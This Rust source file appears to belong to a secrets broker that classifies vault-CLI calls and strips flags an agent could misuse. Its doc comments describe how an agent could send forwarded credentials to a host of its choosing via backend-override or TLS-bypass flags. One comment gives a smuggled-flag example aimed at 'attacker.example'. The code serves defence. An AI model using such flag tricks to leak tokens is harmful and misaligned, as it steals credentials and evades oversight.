use super::{MatcherRule, MatchingResolution, NonEmptyVec, SecretMatcher};

pub type CliMatcherRule = MatcherRule<ArgsAndMatcher, ArgsOnly>;

/// One flag entry in a [`CliIntegrationSpec::strip_arg_flags`] /
/// [`ArgsAndMatcher::strip_arg_flags`] list.
///
/// A bare string (`StripFlag::Named`) is shorthand for
/// `StripFlag::Shaped(FlagShape { flag: <that string>, short: None, value:
/// FlagValue::SeparateOrEquals })` — the crate's original, single-spelling,
/// arity-blind heuristic (see [`FlagValue::SeparateOrEquals`]). Reach for
/// `StripFlag::Shaped` (or the [`StripFlag::shaped`] constructor) instead
/// when that default shape would get the flag wrong, e.g. to declare:
/// * a second spelling for the same flag (e.g. `-u` for `--server-url`,
///   `--tls-skip-verify` for `-tls-skip-verify`),
/// * that the flag never takes a value at all ([`FlagValue::None`]), so the
///   arity-blind heuristic must not swallow whatever positional happens to
///   follow it (e.g. `vault kv get -tls-skip-verify secret/foo` must not
///   lose `secret/foo`), or
/// * that a value may be concatenated directly onto a short alias with no
///   separator at all ([`FlagValue::Concatenated`], getopt-style, e.g.
///   `-uVALUE`) — a form `SeparateOrEquals`'s exact-token/`flag=value`
///   matching cannot recognize, letting an agent smuggle the value past an
///   otherwise-correct stripped-flag list entirely (e.g. `bws secret get id
///   -uhttps://attacker.example`).
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(untagged)]
pub enum StripFlag {
    Named(String),
    Shaped(FlagShape),
}

impl StripFlag {
    /// Builds a [`StripFlag::Shaped`] entry directly, without spelling out
    /// [`FlagShape`] at each call site.
    #[must_use]
    pub fn shaped(flag: &str, short: Option<&str>, value: FlagValue) -> Self {
        Self::Shaped(FlagShape {
            flag: String::from(flag),
            short: short.map(String::from),
            value,
        })
    }

    /// The flag's primary spelling.
    fn primary(&self) -> &str {
        match self {
            Self::Named(flag) => flag,
            Self::Shaped(shape) => &shape.flag,
        }
    }

    /// The flag's additional spelling, if any.
    fn short(&self) -> Option<&str> {
        match self {
            Self::Named(_) => None,
            Self::Shaped(shape) => shape.short.as_deref(),
        }
    }

    /// How this flag's value, if it has one, is attached to it.
    fn value(&self) -> FlagValue {
        match self {
            Self::Named(_) => FlagValue::SeparateOrEquals,
            Self::Shaped(shape) => shape.value,
        }
    }
}

impl From<&str> for StripFlag {
    fn from(flag: &str) -> Self {
        Self::Named(String::from(flag))
    }
}

/// The explicit form of [`StripFlag`]: every spelling this flag can appear
/// as on the command line, and how its value (if any) attaches to it.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct FlagShape {
    /// The flag's primary spelling, exactly as it appears on the command
    /// line (e.g. `"--server-url"`, `"-address"`).
    pub flag: String,
    /// An additional spelling for the same flag (e.g. `"-u"` for
    /// `"--server-url"`), matched with the same `value` shape as `flag`,
    /// except that only `short` is ever eligible for
    /// [`FlagValue::Concatenated`] matching — see that variant's docs.
    #[serde(default)]
    pub short: Option<String>,
    /// How this flag's value (if any) is attached to it on the command line.
    #[serde(default)]
    pub value: FlagValue,
}

/// How a [`StripFlag`]'s value, if it has one, is attached to it on the
/// command line.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FlagValue {
    /// The flag never takes a value: only the bare flag token itself (or
    /// `flag=value`, since e.g. Go's `flag` package accepts `-boolflag=true`
    /// for booleans) is ever stripped — nothing after it is consumed.
    None,
    /// The historical default: a value follows as its own token (`--flag
    /// value`) or is joined with `=` (`--flag=value`). Since this crate
    /// can't otherwise know whether an unlisted flag truly takes a value, an
    /// unrelated positional immediately following an exact-token match is
    /// still swallowed as if it were that value — see
    /// [`CliIntegrationSpec::rewrite_args`] for why that's accepted.
    #[default]
    SeparateOrEquals,
    /// Like `SeparateOrEquals`, but a `short` alias's value may also be
    /// concatenated directly onto it with no separator at all (getopt-style
    /// short options, e.g. `-uVALUE`) — a form `SeparateOrEquals` cannot
    /// recognize (its match is exact-token or `flag=`-prefixed only).
    ///
    /// Deliberately never applied to a [`StripFlag`]'s primary `flag`
    /// spelling, only to `short`: prefix-matching a token against an
    /// arbitrary flag name can otherwise swallow an unrelated flag that
    /// merely shares that prefix (e.g. a hypothetical `--server-url-timeout`
    /// next to a `Concatenated` `--server-url`) — a risk real getopt/clap
    /// parsers avoid by resolving against a known flag registry, which this
    /// crate doesn't have. That collision is far less likely for a short,
    /// single-token alias, so only enable this for a spelling actually
    /// documented to support concatenation.
    Concatenated,
}

/// Per-CLI-tool behavior spec: credentials to forward, command
/// classification, output normalization, and secret extraction from stdout.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct CliIntegrationSpec {
    /// Binary basename (e.g. `"bws"`).
    pub binary_name: String,
    /// Stable integration identity (e.g. `"bitwarden"` for the `bws` binary) —
    /// distinct from `binary_name`, which is the per-invocation executable.
    pub provider_id: String,
    /// Names of env vars that carry vault credentials. The broker forwards any
    /// that are present in its own environment to the subprocess.
    pub credential_env_vars: Vec<String>,
    /// Arg flags stripped from every resolved invocation, regardless of which
    /// rule matched — unlike [`ArgsAndMatcher::strip_arg_flags`], which only
    /// applies when its own `SensitiveCommand` rule is selected, these apply
    /// to `SensitiveCommand` and `SafeCommand` resolutions alike (see
    /// [`Self::rewrite_args`]). Meant for flags that let the invocation
    /// redirect the CLI at a different backend or bypass TLS verification
    /// (e.g. Doppler's `--api-host`/`--no-verify-tls`, Vault's
    /// `-address`/`-tls-skip-verify`) — an agent could otherwise use one of
    /// these on an *otherwise-permitted* command to make the subprocess send
    /// the forwarded `credential_env_vars` token to a host of its choosing,
    /// regardless of how well-redacted that command's own stdout is. See
    /// [`StripFlag`] for how to shape an entry beyond a bare flag name.
    #[serde(default)]
    pub strip_arg_flags: Vec<StripFlag>,
    /// Candidate rules, tried against the invocation's args via
    /// [`CliIntegrationSpec::resolve_args`]. A single binary can emit
    /// different output shapes for different subcommands (e.g. `bws secret
    /// list` returns an array of records, `bws secret get` returns a single
    /// record), so the rule to apply is resolved per invocation rather than
    /// fixed per binary. An invocation whose args match no rule here is
    /// [`MatchingResolution::Blocked`] — fail closed, since an unrecognized
    /// invocation shape may emit secret material this registry has no way to
    /// extract or redact.
    pub matchers: Vec<CliMatcherRule>,
}

impl CliIntegrationSpec {
    /// Resolves how the broker should handle an invocation with the given
    /// args: apply a matcher, forward stdout unredacted as a known-safe
    /// pass-through, or block the invocation outright.
    ///
    /// Follows a specific order:
    /// * first blocked commands, that should be forbidden no matter what
    /// * second sensitive commands, to apply secret redaction
    /// * third safe commands, to let through without redaction
    ///
    /// Any command not falling in any of those rules will be blocked as an
    /// extra safety measure.
    ///
    /// A rule's `args_match` doesn't have to be a literal argv prefix: see
    /// [`args_matches`] for how flags interspersed before, between, or after
    /// the matched tokens (e.g. a global flag placed ahead of the
    /// subcommand) are tolerated.
    #[must_use]
    pub fn resolve_args(&self, args: &[String]) -> MatchingResolution<'_> {
        // blocked commands
        if self
            .matchers
            .iter()
            .filter_map(MatcherRule::as_blocked_command)
            .any(|rule| args_matches(args, &rule.args_match))
        {
            return MatchingResolution::Blocked;
        }

        // sensitive commands
        if let Some(rule) = self
            .matchers
            .iter()
            .filter_map(MatcherRule::as_sensitive_command)
            .find(|rule| args_matches(args, &rule.args_match))
        {
            return MatchingResolution::Matcher(&rule.matcher);
        }

        // safe commands
        if self
            .matchers
            .iter()
            .filter_map(MatcherRule::as_safe_command)
            .any(|rule| args_matches(args, &rule.args_match))
        {
            return MatchingResolution::PassThrough;
        }

        MatchingResolution::Blocked
    }

    /// Rewrites the shim-requested args for the actual subprocess
    /// invocation, for whichever rule [`Self::resolve_args`] would select for
    /// `args`.
    ///
    /// For a `SensitiveCommand` match: strips [`Self::strip_arg_flags`]
    /// and the rule's own `strip_arg_flags` entries, then appends its
    /// `forced_args`. Different sensitive commands on the same binary can
    /// require different forced output shapes (e.g. `doppler secrets
    /// download` forces `--format json --no-file`, while bare `doppler
    /// secrets` forces `--json` and strips `--raw`), so those live on the
    /// rule rather than the spec.
    ///
    /// For a `SafeCommand` match: strips [`Self::strip_arg_flags`]
    /// only — a pass-through command has no `forced_args`/`strip_arg_flags`
    /// of its own, but still must not let a backend-override or
    /// TLS-bypass flag through unstripped just because its own output needs
    /// no redaction.
    ///
    /// Returns `args` unchanged if no `SensitiveCommand` or `SafeCommand`
    /// rule matches — there's nothing to rewrite for a blocked invocation,
    /// since it's never executed.
    ///
    /// How a stripped flag's trailing token is (or isn't) treated as its
    /// value is governed by that [`StripFlag`]'s [`FlagValue`] shape — see
    /// [`strip_flags_from_args`] and [`FlagValue`]'s variants for the exact
    /// rules, including the arity-blind default's known limitation.
    #[must_use]
    pub fn rewrite_args(&self, args: &[String]) -> Vec<String> {
        if let Some(rule) = self
            .matchers
            .iter()
            .filter_map(MatcherRule::as_sensitive_command)
            .find(|rule| args_matches(args, &rule.args_match))
        {
            let mut strip_flags = self.strip_arg_flags.clone();
            strip_flags.extend(rule.strip_arg_flags.iter().cloned());
            let mut rewritten = strip_flags_from_args(args, &strip_flags, &rule.args_match);
            rewritten.extend(rule.forced_args.iter().cloned());
            return rewritten;
        }

        if let Some(rule) = self
            .matchers
            .iter()
            .filter_map(MatcherRule::as_safe_command)
            .find(|rule| args_matches(args, &rule.args_match))
        {
            return strip_flags_from_args(args, &self.strip_arg_flags, &rule.args_match);
        }

        args.to_vec()
    }
}

/// Whether/how a single arg token matched a [`StripFlag`].
enum FlagTokenMatch {
    /// The token's value (if any) is embedded in the token itself — either
    /// `flag=value`, or, for a `short` alias shaped
    /// [`FlagValue::Concatenated`], `flag` immediately followed by the value
    /// with no separator at all (e.g. `-uVALUE`). Nothing else is consumed.
    WholeToken,
    /// The token is exactly one of the flag's spellings, with no value
    /// embedded in it — the *next* token may still be consumed as this
    /// flag's value, per [`strip_flags_from_args`]'s rules.
    ExactSpelling,
}

/// Matches `arg` against every spelling of `strip_flag`, returning how (if
/// at all) it matched. See [`FlagTokenMatch`] and [`FlagValue`] for what each
/// outcome means.
fn match_flag_token(arg: &str, strip_flag: &StripFlag) -> Option<FlagTokenMatch> {
    if let Some(matched) = match_spelling(arg, strip_flag.primary(), false) {
        return Some(matched);
    }
    let short = strip_flag.short()?;
    match_spelling(arg, short, strip_flag.value() == FlagValue::Concatenated)
}

/// Matches a single spelling of a flag against `arg`. `allow_concatenated`
/// additionally recognizes `spelling` immediately followed by a value with
/// no separator (getopt-style, e.g. `-uVALUE`) — deliberately only ever
/// passed `true` for a [`StripFlag`]'s `short` alias; see
/// [`FlagValue::Concatenated`]'s docs for why the primary spelling never
/// gets this treatment.
fn match_spelling(arg: &str, spelling: &str, allow_concatenated: bool) -> Option<FlagTokenMatch> {
    if arg == spelling {
        return Some(FlagTokenMatch::ExactSpelling);
    }
    let rest = arg.strip_prefix(spelling)?;
    if rest.starts_with('=') || (allow_concatenated && !rest.is_empty()) {
        return Some(FlagTokenMatch::WholeToken);
    }
    None
}

/// Removes every occurrence of any flag in `flags_to_strip` from `args`, per
/// each entry's [`StripFlag`] shape. `protected_tokens` (a matched rule's
/// own `args_match`) is never consumed as a stripped flag's value — see
/// [`CliIntegrationSpec::rewrite_args`] for why.
///
/// An `ExactSpelling` match's trailing token is only consumed as the flag's
/// value when the flag's [`FlagValue`] isn't `None`, and even then only when
/// that trailing token doesn't itself look like a flag (start with `-`) and
/// isn't one of `protected_tokens` — a subcommand word that `resolve_args`
/// relied on to select the very rule this stripping happens for, that
/// happens to follow it. `FlagValue::SeparateOrEquals` (the shape a bare
/// [`StripFlag::Named`] entry gets) carries no true arity awareness, though:
/// a flag declared that way, immediately followed by a plain positional that
/// is neither a flag nor a protected token, still has that positional
/// swallowed as if it were the flag's value, even if the flag never actually
/// takes one. Declare the flag as [`StripFlag::Shaped`] with
/// `FlagValue::None` to opt out of that and preserve the following
/// positional instead.
fn strip_flags_from_args(
    args: &[String],
    flags_to_strip: &[StripFlag],
    protected_tokens: &[String],
) -> Vec<String> {
    let mut rewritten = Vec::with_capacity(args.len());
    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        let Some((strip_flag, matched)) = flags_to_strip
            .iter()
            .find_map(|flag| match_flag_token(arg, flag).map(|matched| (flag, matched)))
        else {
            rewritten.push(arg.clone());
            continue;
        };

        if matches!(matched, FlagTokenMatch::ExactSpelling)
            && strip_flag.value() != FlagValue::None
            && iter
                .peek()
                .is_some_and(|next| !next.starts_with('-') && !protected_tokens.contains(next))
        {
            iter.next();
        }
    }
    rewritten
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ArgsAndMatcher {
    /// Subcommand and positional args (e.g. `["secret", "get"]`) that an
    /// invocation's args must contain, in order, to select this rule — see
    /// [`args_matches`] for exactly how flags interspersed among them are
    /// tolerated.
    #[serde(default)]
    pub args_match: Vec<String>,
    /// How to extract `(name, value)` pairs from the tool's stdout.
    pub matcher: SecretMatcher,
    /// Arg flags to strip from the shim's requested args when this rule is
    /// selected, before appending `forced_args`. See [`StripFlag`] for the
    /// per-entry shape (bare name vs. explicit spellings/value form) and
    /// [`CliIntegrationSpec::rewrite_args`] for exactly how a flag's
    /// trailing value is recognized. Example: `vec![StripFlag::from("--format")]`.
    #[serde(default)]
    pub strip_arg_flags: Vec<StripFlag>,
    /// Args appended to the subprocess command when this rule is selected,
    /// after stripping. Used to force a specific output format that
    /// `matcher` expects. Example: `vec!["--format", "json"]`.
    #[serde(default)]
    pub forced_args: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ArgsOnly {
    /// Subcommand and positional args (e.g. `["secret", "get"]`) that an
    /// invocation's args must contain, in order, to select this rule — see
    /// [`args_matches`] for exactly how flags interspersed among them are
    /// tolerated.
    pub args_match: NonEmptyVec<String>,
}

/// Whether `args` contains every token of `matcher`, in the same order,
/// tolerating arbitrary flags interspersed before, between, or after them
/// (e.g. a global flag placed ahead of the subcommand, or a per-command flag
/// placed between two subcommand tokens).
///
/// A token is treated as a flag if it starts with `-`. A `--flag value`
/// pair (as opposed to the self-contained `--flag=value` form) may consume
/// the immediately following token as its value and skip it too — but only
/// when that token isn't itself required to continue matching `matcher` and
/// doesn't look like a flag itself, so a bare boolean flag immediately
/// followed by the next expected `matcher` token doesn't swallow it. A
/// token that is neither a flag nor the next expected `matcher` token is an
/// unexpected positional argument and fails the match — this is what keeps
/// `["kv", "get"]` from matching `["kv", "list"]`.
///
/// An empty `matcher` matches any `args`, mirroring `[].starts_with(...)`.
fn args_matches(args: &[String], matcher: &[String]) -> bool {
    let mut args = args.iter();
    let mut matcher = matcher.iter();
    let Some(mut expected) = matcher.next() else {
        return true;
    };

    while let Some(arg) = args.next() {
        if arg == expected {
            let Some(next) = matcher.next() else {
                return true;
            };
            expected = next;
            continue;
        }

        if !arg.starts_with('-') {
            return false;
        }

        if !arg.contains('=') {
            let mut lookahead = args.clone();
            if let Some(value) = lookahead.next()
                && value != expected
                && !value.starts_with('-')
            {
                args = lookahead;
            }
        }
    }

    false
}
